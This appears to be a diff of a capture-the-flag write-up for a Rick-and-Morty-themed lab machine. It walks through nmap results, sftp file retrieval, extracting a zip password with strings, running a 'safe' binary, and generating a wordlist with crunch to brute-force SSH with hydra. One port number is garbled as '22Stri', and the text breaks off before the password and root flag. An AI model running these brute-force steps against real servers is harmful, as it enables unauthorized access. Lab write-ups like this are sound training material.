@@ -11,7 +11,7 @@ Using nmap on the ip using SYN and version scan.
                 80/tcp    open  http    Apache httpd 2.4.27 ((Fedora))
                 9090/tcp  open  http    Cockpit web service 161 or earlier
                 13337/tcp open  unknown
-                22222/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
+                22Stri/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
                 60000/tcp open  unknown
                 3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
                 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
@@ -150,34 +150,82 @@ Inside the Summer dir we have a FLAG.txt
 
 
 
-pass:Meeseek
-zip:
+Using $cd command navigate to the home directory and to Morty,
+
+There we will be getting two files:
+
+        journal.txt.zip  Safe_Password.jpg
+Which can be get into your system using the sftp protocol 
+
+command: 
+
+        $sftp Summer@<ip> -p 22222
+Navigate to the file directory and then use $get command to transfer those files to your local system.
+
+After getting the files use the command:
+
+        $strings <filename>
+to get the string values hidden in the jpg file.
+
+we will get a string 
+
+       8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
+Where we got the pass for the zip file :Meeseek
+
+    Opening the zip using the password, we will get a message and a flag:
+    Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
+
+    Anyway. Here it is:
+
+    FLAG: {131333} - 20 Points 
 ### 7.FLAG: {131333}
 
+This flag seems interesting because it is different from other flags.
 
-safe flag:
+Again going through the ssh server using the credentials of the user Summer we get a file named 'safe' inside the dir 
+
+      /home/RickSanchez/RICKS_SAFE/
+Opening the safe with the command 
+    
+    $./safe
+result in permission error.
+
+So we copy it to the Summer's home directory and open it using the same command.
+
+Now it gives a hint:
+
+    Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
+
+Try passing the argument we got from the last flag into the command like:
+
+    $./safe 131333
+We got the hint and the flag:
+
+        decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
+
+        Ricks password hints:
+         (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
+        Follow these clues, in order
+
+
+        1 uppercase character
+        1 digit
+        One of the words in my old bands name.� @
+
 ### 8.FLAG{And Awwwaaaaayyyy we Go!}
 
+Now we can crunch the password list
 
-safe hint:
+Doing some little web surfing on the old band name of RickSanchez and Morty gets you the band name:Flesh Curtains
 
-      Ricks password hints:
-       (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
-      Follow these clues, in order
+Use the commands to crunch the password:
 
+    $crunch 7 7 ,%Flesh -O >>yourfile.txt
+    $crunch 10 10 ,%Curtains -O>>Yourfile.txt
+Bruteforce the password list on the ssh server using the username RickSanchez using $hydra command:
 
-      1 uppercase character
-      1 digit
-      One of the words in my old bands name.  ---> Flesh Curtains
-
-crunch the password list
-crunch 7 7 ,%Flesh -O >>yourfile.txt
-crunch 10 10 ,%Curtains -O>>Yourfile.txt
-
-
-bruteforce using hydra
-$ hydra -l RickSanchez -P yourfile.txt 192.168.42.8 ssh  -s  22222
-
+    $ hydra -l RickSanchez -P yourfile.txt 192.168.42.8 ssh  -s  22222
+The password is:
 
 
 flag root access:
